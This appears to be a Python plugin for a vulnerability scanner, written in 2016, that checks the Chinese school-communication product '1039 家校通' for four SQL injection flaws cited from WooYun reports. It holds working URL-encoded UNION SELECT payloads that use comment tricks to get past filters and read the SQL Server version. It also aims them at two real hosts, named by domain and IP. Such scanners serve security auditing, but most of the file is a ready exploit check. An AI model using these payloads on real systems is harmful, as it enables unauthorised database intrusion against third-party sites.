#!/usr/bin/evn python
#-*-:coding:utf-8 -*-

#Author:wonderkun
#Name:1039 家校通 4处sql报错注入   （补yichin的漏,求yichin别打）
#Refer:http://www.wooyun.org/bugs/wooyun-2010-0131010
#Refer:http://www.wooyun.org/bugs/wooyun-2010-0127988



# admin/systems/SetDataWindowStyle.aspx?dwname=1' union/**/select/**/1,2,3,@@version,5,6--
# Handler/Soft/GetStuproc.ashx?per_id=1' union select/**/1,2,3,@@version,5,6--

# admin/Product/comstye2.aspx?id=1 union/**/select/**/1,2,@@version
# admin/rooms/AddRoom.aspx?cid=1%20union/**/select/**/1,2,3,4,@@VERSION,6,7,8,9,10,11,12


#Data:2016/2/20
import time

def  assign(service,arg):
    if service=="1039_jxt":
        return  True,arg

def audit(arg):
    url_payloads={"admin/systems/SetDataWindowStyle.aspx?dwname=1":"%27%20union%2f%2a%2a%2fselect%2f%2a%2a%2f1%2C2%2C3%2C@@version%2C5%2C6--",
                  "Handler/Soft/GetStuproc.ashx?per_id=1":"%27%20union%20select%2f%2a%2a%2f1%2C2%2C3%2C@@version%2C5%2C6--",
                  "admin/Product/comstye2.aspx?id=1":"%20union%2f%2a%2a%2fselect%2f%2a%2a%2f1%2C2%2C@@version",
                  "admin/rooms/AddRoom.aspx?cid=1":"%20union%2f%2a%2a%2fselect%2f%2a%2a%2f1%2C2%2C3%2C4%2C@@VERSION%2C6%2C7%2C8%2C9%2C10%2C11%2C12"}
    for  url in url_payloads:
        code,head,res,errcode,finalurl=curl.curl2(arg+url+url_payloads[url])
        if code==200 and "Microsoft SQL Server" in res:
            security_hole("sql inject:"+arg+url)

if __name__=="__main__":
    from dummy import *
    audit(assign('1039_jxt','http://www.whaqjx.com/')[1])
    audit(assign('1039_jxt','http://175.19.190.18:82/')[1])